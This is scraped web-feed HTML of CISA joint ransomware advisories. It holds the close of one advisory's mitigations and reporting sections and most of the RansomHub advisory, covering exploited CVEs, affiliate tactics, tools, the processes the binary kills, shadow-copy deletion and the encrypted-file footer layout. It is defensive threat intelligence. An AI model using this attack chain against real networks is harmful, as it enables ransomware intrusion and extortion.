<li><strong>Segment networks</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>]. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus</strong> <strong>software on all hosts.</strong></li>
<li><strong>Implement Secure Logging Collection and Storage Practices&nbsp;</strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#LogCollection2T\" title=\"Log Collection (2.T)\">CPG 2.T</a>].<strong>&nbsp;</strong>Learn more about logging best practices by referencing <a href=\"https://www.cisa.gov/resources-tools/services/logging-made-easy\" title=\"Logging Made Easy\">CISA’s Logging Made Easy</a> resources.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts.</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege.</li>
<li><strong>Disable unused ports.</strong></li>
<li><strong>Implement and enforce email security policies</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M\" title=\"Email Security (2.M)\">CPG 2.M</a>].</li>
<li><strong>Disable macros by default</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default (2.N)\">CPG 2.N</a>].</li>
<li><strong>Consider adding an email banner to emails</strong> received from outside your organization.</li>
<li><strong>Disable hyperlinks in received emails.</strong></li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.</li>
<li><strong>Maintain offline backups of data, and regularly maintain backup and restoration</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"System Backups (2.R)\">CPG 2.R</a>]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.</li>
<li><strong>Ensure all backup data is encrypted,</strong> immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.</li>
</ul>
<h3>Software Manufacturers</h3>
<p>The above mitigations apply to enterprises and critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of many of these flaws and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of identified or exploited issues (e.g., misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team):</p>
<ul>
<li><strong>Embed security into product architecture</strong> throughout the entire software development lifecycle (SDLC).</li>
<li><strong>Mandate MFA, ideally phishing-resistant MFA, for privileged users</strong> and make MFA a default, rather than opt-in, feature.</li>
</ul>
<p>These mitigations align with tactics provided in the joint guide <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.</p>
<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> webpage.</p>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see<strong>&nbsp;Table 6–Table 17</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>CISA, FBI, MS-ISAC, and HHS recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Resources</strong></h2>
<ul>
<li>#<a href=\"https://www.stopransomware.gov/\">StopRansomware</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to reduce the risk of a ransomware attack: <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\">#StopRansomware Guide</a>.</li>
<li>No-cost cyber hygiene services: <a href=\"https://www.cisa.gov/cyber-hygiene-services\">Cyber Hygiene Services</a> and <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\">Ransomware Readiness Assessment</a>.</li>
<li>Health and Human Services <a href=\"https://hhscyber.hhs.gov/\">HPH Cybersecurity Gateway</a> hosts the HPH CPGs and links to HHS cybersecurity resources.</li>
</ul>
<h2><strong>References</strong></h2>
<ol>
<li><a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-knight\" title=\"Ransomware Roundup - Knight\">Ransomware Roundup - Knight | FortiGuard Labs (fortinet.com)</a></li>
<li><a href=\"https://redskyalliance.org/xindustry/knight-ransomware\" title=\"Knight Ransomware\">Knight Ransomware - X-Industry - Red Sky Alliance</a></li>
<li><a href=\"https://www.uptycs.com/blog/threat-research-report-team/cyclops-ransomware-stealer-combo\" title=\"Exploring a Dual Threat: Cyclops Ransomware &amp; Stealer Combo\">Cyclops Ransomware and Stealer Combo: Exploring a Dual Threat (uptycs.com)</a></li>
<li><a href=\"https://www.bleepingcomputer.com/news/security/knight-ransomware-distributed-in-fake-tripadvisor-complaint-emails/\" title=\"Knight ransomware distributed in fake Tripadvisor complaint emails\">Knight ransomware distributed in fake Tripadvisor complaint emails (bleepingcomputer.com)</a></li>
</ol>
<h2><strong>Reporting</strong></h2>
<p>Your organization has no obligation to respond or provide information to the FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The authoring organizations do not encourage paying a ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, a <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, or CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov)\" title=\"Report to CISA\">report@cisa.gov</a>) or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring organizations.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a" (26320 15511) new 4 nil nil ((title nil "#StopRansomware: RansomHub Ransomware") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a") (description nil "<h2><strong>Summary</strong></h2>
<p><em><strong>Note:</strong> This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the Department of Health and Human Services (HHS) (hereafter referred to as the authoring organizations)&nbsp;are releasing this joint advisory to disseminate known RansomHub ransomware IOCs and TTPs. These have been identified through FBI threat response activities and third-party reporting as recently as August 2024. RansomHub is a ransomware-as-a-service variant—formerly known as Cyclops and Knight—that has established itself as an efficient and successful service model (recently attracting high-profile affiliates from other prominent variants such as LockBit and ALPHV).</p>
<p>Since its inception in February 2024, RansomHub has encrypted and exfiltrated data from at least 210 victims representing the water and wastewater, information technology, government services and facilities, healthcare and public health, emergency services, food and agriculture, financial services, commercial facilities, critical manufacturing, transportation, and communications critical infrastructure sectors.</p>
<p>The affiliates leverage a double-extortion model by encrypting systems and exfiltrating&nbsp;data to extort victims. It should be noted that data exfiltration methods are dependent on the affiliate conducting the network compromise. The ransom note dropped during encryption does not generally include an initial ransom demand or payment instructions. Instead, the note provides victims with a client ID and instructs them to contact the ransomware group via a unique <code>.onion</code> URL (reachable through the Tor browser). The ransom note typically gives victims between three and 90 days to pay the ransom (depending on the affiliate) before the ransomware group publishes their data on the RansomHub Tor data leak site.</p>
<p>The authoring organizations encourage network defenders to implement the recommendations in the&nbsp;<strong>Mitigations</strong> section of this cybersecurity advisory to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-242a-stopransomware-ransomhub-ransomware_1.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-242A #StopRansomware: RansomHub Ransomware</a>
    <span class=\"c-file__size\">(PDF,       825.67 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-242A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-242A STIX XML</a>
    <span class=\"c-file__size\">(XML,       133.74 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-242A-StopRansomware-RansomHub-Ransomware.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-242A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       109.41 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK<sup>®</sup> Matrix for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3>Initial Access</h3>
<p>RansomHub affiliates typically compromise internet facing systems and user endpoints by using methods such as phishing emails [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a>], exploitation of known vulnerabilities [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>], and password spraying [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>]. Password spraying targets accounts compromised through data breaches. Proof-of-concept exploits are obtained from sources such as ExploitDB and GitHub [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\" title=\"Obtain Capabilities: Exploits\">T1588.005</a>]. Exploits based on the following CVEs have been observed:</p>
<ul>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-3519\" title=\"CVE-2023-3519\">CVE-2023-3519</a> (<a href=\"https://www.cvedetails.com/cwe-details/94/Improper-Control-of-Generation-of-Code-Code-Injection-.html\" title=\"CWE-94 : Improper Control of Generation of Code ('Code Injection')\">CWE-94</a>)
<ul>
<li>Citrix ADC (NetScaler) Remote Code Execution. A vulnerability exists within Citrix ADC that allows an unauthenticated attacker to trigger a stack buffer overflow of the NSPPE (NetScaler Packet Processing Engine) process by making a specially crafted HTTP GET request. Successful exploitation results in remote code execution as root.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-27997\" title=\"CVE-2023-27997\">CVE-2023-27997</a> (<a href=\"https://www.cvedetails.com/cwe-details/787/Out-of-bounds-Write.html\" title=\"CWE-787 : Out-of-bounds Write\">CWE-787</a> | <a href=\"https://www.cvedetails.com/cwe-details/122/Heap-based-Buffer-Overflow.html\" title=\"CWE-122 : Heap-based Buffer Overflow\">CWE-122</a>)
<ul>
<li>A heap-based buffer overflow vulnerability in FortiOS version 7.2.4 and below, version 7.0.11 and below, version 6.4.12 and below, version 6.0.16 and below and FortiProxy version 7.2.3 and below, version 7.0.9 and below, version 2.0.12 and below, version 1.2 all versions, version 1.1 all versions SSL-VPN may allow a remote attacker to execute arbitrary code or commands via specifically crafted requests.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-46604\" title=\"CVE-2023-46604\">CVE-2023-46604</a> (<a href=\"https://www.cvedetails.com/cwe-details/502/Deserialization-of-Untrusted-Data.html\" title=\"CWE-502 : Deserialization of Untrusted Data\">CWE-502</a>)
<ul>
<li>The Java OpenWire protocol marshaller, such as in Apache ActiveMQ, is vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to open either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath. Upgrading both brokers and clients to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3 fixes this issue.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-22515\" title=\"CVE-2023-22515\">CVE-2023-22515</a>
<ul>
<li>A vulnerability in publicly accessible Confluence Data Center and Server instances that allows the creation of unauthorized Confluence administrator accounts and access to Confluence instances. Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-46747\" title=\"CVE-2023-46747\">CVE-2023-46747</a> (<a href=\"https://www.cvedetails.com/cwe-details/306/Missing-Authentication-for-Critical-Function.html\" title=\"CWE-306 : Missing Authentication for Critical Function\">CWE-306</a> | <a href=\"https://www.cvedetails.com/cwe-details/288/Authentication-Bypass-Using-an-Alternate-Path-or-Channel.html\" title=\"CWE-288 : Authentication Bypass Using an Alternate Path or Channel\">CWE-288</a>)
<ul>
<li>Undisclosed requests may bypass configuration utility authentication, allowing an attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands. <strong>Note:</strong> Software versions which have reached End of Technical Support (EoTS) are not evaluated.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-48788\" title=\"CVE-2023-48788\">CVE-2023-48788</a> (<a href=\"https://www.cvedetails.com/cwe-details/89/Improper-Neutralization-of-Special-Elements-used-in-an-SQL-C.html\" title=\"CWE-89 : Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\">CWE-89</a>)
<ul>
<li>An improper neutralization of special elements used in an SQL command (SQL injection') in Fortinet FortiClientEMS version 7.2.0 through 7.2.2 and FortiClientEMS 7.0.1 through 7.0.10 allows attacker to execute unauthorized code or commands via specially crafted packets.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2017-0144\" title=\"CVE-2017-0144\">CVE-2017-0144</a>
<ul>
<li>The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, also known as “Windows SMB Remote Code Execution Vulnerability” [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1210/\">T1210</a>].</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2020-1472\" title=\"CVE-2020-1472\">CVE-2020-1472</a>
<ul>
<li>An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller using the Netlogon Remote Protocol (MS-NRPC).</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2020-0787\" title=\"CVE-2020-0787\">CVE-2020-0787</a>
<ul>
<li>This vulnerability was also potentially exploited along with the Zerologon privilege escalation vulnerability.</li>
</ul>
</li>
</ul>
<h3>Discovery</h3>
<p>RansomHub affiliates conduct network scanning with tools such as AngryIPScanner, Nmap, and PowerShell-based living off the land methods with PowerShell to conduct network scanning [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</p>
<h3>Defense Evasion</h3>
<p>Cybersecurity researchers have observed affiliates renaming the ransomware executable with innocuous file names, such as <code>Windows.exe</code>, left on the user’s desktop (<code>C:\\Users\\%USERNAME%\\Desktop</code>) or downloads (<code>C:\\Users\\%USERNAME%\\Downloads</code>) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>]. The affiliates have also cleared Windows and Linux system logs to inhibit any potential incident response [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>]. Affiliates used Windows Management Instrumentation [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a>] to disable antivirus products. In some instances, RansomHub-specific tools were deployed to disable endpoint detection and response (EDR) tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</p>
<h3>Privilege Escalation and Lateral Movement</h3>
<p>Following initial access, RansomHub affiliates created user accounts for persistence [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136</a>], reenabled disabled accounts [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a>], and used Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>] on Windows systems to gather credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>] and escalate privileges to SYSTEM [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>]. Affiliates then moved laterally inside the network through methods including Remote Desktop Protocol (RDP) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>], PsExec [<a href=\"https://attack.mitre.org/versions/v15/software/S0029/\" title=\"PsExec\">S0029</a>], Anydesk [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>], Connectwise, N-Able, Cobalt Strike [<a href=\"https://attack.mitre.org/versions/v15/software/S0154/\" title=\"Cobalt Strike\">S0154</a>], Metasploit, or other widely used command-and-control (C2) methods.</p>
<h3>Data Exfiltration</h3>
<p>Data exfiltration methods depend heavily on the affiliate conducting the network compromise. The ransomware binary does not normally include any mechanism for data exfiltration. Data exfiltration has been observed through the usage of tools such as PuTTY [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/002/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\">T1048.002</a>], Amazon AWS S3 buckets/tools [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1537/\" title=\"Transfer Data to Cloud Account\">T1537</a>], HTTP POST requests [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/003/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol\">T1048.003</a>], WinSCP, Rclone, Cobalt Strike, Metasploit, and other methods.</p>
<h3>Encryption</h3>
<p>RansomHub ransomware has typically leveraged an Elliptic Curve Encryption algorithm called Curve 25519 to encrypt user accessible files on the system [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. Curve 25519 uses a public/private key that is unique to each victim organization. To successfully encrypt files that are currently in use, the ransomware binary will typically attempt to stop the following processes:</p>
<ul>
<li><em>\"vmms.exe\"</em></li>
<li><em>\"msaccess.exe\"</em></li>
<li><em>\"mspub.exe\"</em></li>
<li><em>\"svchost.exe\"</em></li>
<li><em>\"vmcompute.exe\"</em></li>
<li><em>\"notepad.exe\"</em></li>
<li><em>\"ocautoupds.exe\"</em></li>
<li><em>\"ocomm.exe\"</em></li>
<li><em>\"ocssd.exe\"</em></li>
<li><em>\"oracle.exe\"</em></li>
<li><em>\"onenote.exe\"</em></li>
<li><em>\"outlook.exe\"</em></li>
<li><em>\"powerpnt.exe\"</em></li>
<li><em>\"explorer.exe\"</em></li>
<li><em>\"sql.exe\"</em></li>
<li><em>\"steam.exe\"</em></li>
<li><em>\"synctime.exe\"</em></li>
<li><em>\"vmwp.exe\"</em></li>
<li><em>\"thebat.exe\"</em></li>
<li><em>\"thunderbird.exe\"</em></li>
<li><em>\"visio.exe\"</em></li>
<li><em>\"winword.exe\"</em></li>
<li><em>\"wordpad.exe\"</em></li>
<li><em>\"xfssvccon.exe\"</em></li>
<li><em>\"TeamViewer.exe\"</em></li>
<li><em>\"agntsvc.exe\"</em></li>
<li><em>\"dbsnmp.exe\"</em></li>
<li><em>\"dbeng50.exe\"</em></li>
<li><em>\"encsvc.exe\"</em></li>
</ul>
<p>The ransomware binary will attempt to encrypt any files that the user has access to, including user files and networked shares.</p>
<p>RansomHub implements intermittent encryption, encrypting files in 0x100000 byte chunks and skipping every 0x200000 bytes of data in between encrypted chunks. Files smaller than 0x100000 bytes in size are completely encrypted. Files are appended with 58 (0x3A) bytes of data at the end. This data contains a value which is likely part of an encryption/decryption key. The structure of the appended 0x3A bytes is listed below with images from three different encrypted files.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%201%20-%20The%20first%20eight%20bytes.png?itok=7KCmOV_-\" width=\"496\" height=\"116\" alt=\"Figure 1 - The first eight bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 1: The first eight bytes are the size of the encrypted file.</em></figcaption>
  </figure>
<p>The next eight bytes are the size of encrypted blocks. If the entire file is encrypted, this section is all zeros. In this example, each encrypted section is 0x100000 bytes long, with 0x100000 bytes between each encrypted block. This number was observed changing based on the size of the encrypted file.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%202%20-%20The%20size%20of%20encrypted%20blocks.png?itok=59AF45Sy\" width=\"496\" height=\"85\" alt=\"Figure 2 - The size of encrypted blocks\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 2: The size of encrypted blocks.</em></figcaption>
  </figure>
<p>The next two bytes were always seen to be 0x0001.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%203%20-%20The%20next%20two%20bytes.png?itok=M7DpLyKf\" width=\"494\" height=\"100\" alt=\"Figure 3 - The next two bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 3: The next two bytes are always 0x0001.</em></figcaption>
  </figure>
<p>The next 32 bytes are the public encryption key for the file.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%204%20-%20Public%20encryption%20key.png?itok=V09lNet1\" width=\"493\" height=\"94\" alt=\"Figure 4 - Public encryption key\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 4: Public encryption key for the file.</em></figcaption>
  </figure>
<p>The next four bytes are a checksum value.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%205%20-%20Checksum%20value.png?itok=27hZrM7n\" width=\"498\" height=\"83\" alt=\"Figure 5 - Checksum value\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 5: Checksum value.</em></figcaption>
  </figure>
<p>The last four bytes are always seen to be the sequence 0x00ABCDEF.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%206%20-%20The%20last%20four%20bytes.png?itok=cT5kmoKF\" width=\"495\" height=\"82\" alt=\"Figure 6 - The last four bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 6: The last four bytes.</em></figcaption>
  </figure>
<p>The ransomware executable does not typically encrypt executable files.&nbsp;A random file extension is added to file names and a ransom note generally titled <code>How To Restore Your Files.txt</code> is left on the compromised system. To further inhibit system recovery, the ransomware executable typically leverages the <code>vssadmin.exe</code> program to delete volume shadow copies [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>].</p>
<h3>Leveraged Tools</h3>
<p>See <strong>Table 1</strong> for publicly available tools and applications used by RansomHub affiliates. This includes legitimate tools repurposed for their operations.</p>
<p><strong>Disclaimer:</strong> Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Used by RansomHub Affiliates</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Tool Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSAdmin</td>
<td>A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.</td>
</tr>
<tr>
<td>Cobalt Strike [<a href=\"https://attack.mitre.org/versions/v15/software/S0154/\" title=\"Cobalt Strike\">S0154</a>]</td>
<td>A penetration testing tool used by security professionals to test the security of networks and systems. RansomHub affiliates have used it to assist with lateral movement and file execution.</td>
</tr>
<tr>
<td>Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>]</td>
<td>A tool that allows users to view and save authentication credentials such as Kerberos tickets. RansomHub affiliates have used it to aid privilege escalation.</td>
</tr>
<tr>
<td>PSExec [<a href=\"https://attack.mitre.org/versions/v15/software/S0029/\" title=\"PSExec\">S0029</a>]</td>
<td>A tool designed to run programs and execute commands on remote systems.</td>
</tr>
<tr>
<td>PowerShell</td>
<td>Cross-platform task automation solution made up of a command line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td>RClone</td>
<td>A command line program used to sync files with cloud storage services.</td>
</tr>
<tr>
<td>Sliver</td>
<td>A penetration testing toolset which allows for remote command and control of systems.</td>
</tr>
<tr>
<td>SMBExec</td>
<td>A tool designed to manipulate SMB services for remote code execution.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Affiliates have used it to transfer data from a compromised network to actor-controlled accounts.</td>
</tr>
<tr>
<td>CrackMapExec</td>
<td>Pentest Toolset</td>
</tr>
<tr>
<td>Kerberoast</td>
<td>Kerberos Brute force and Exploitation Tool</td>
</tr>
<tr>
<td>AngryIPScanner</td>
<td>Network Scanner</td>
</tr>
</tbody>
</table>
<h2><strong>Indicators of Compromise</strong></h2>
<p><strong>Disclaimer:</strong> Several of these IP addresses were first observed as early as 2020, although most date from 2022 or 2023 and have been historically linked to QakBot. The authoring organizations recommend organizations investigate or vet these IP addresses prior to taking action (such as blocking).</p>
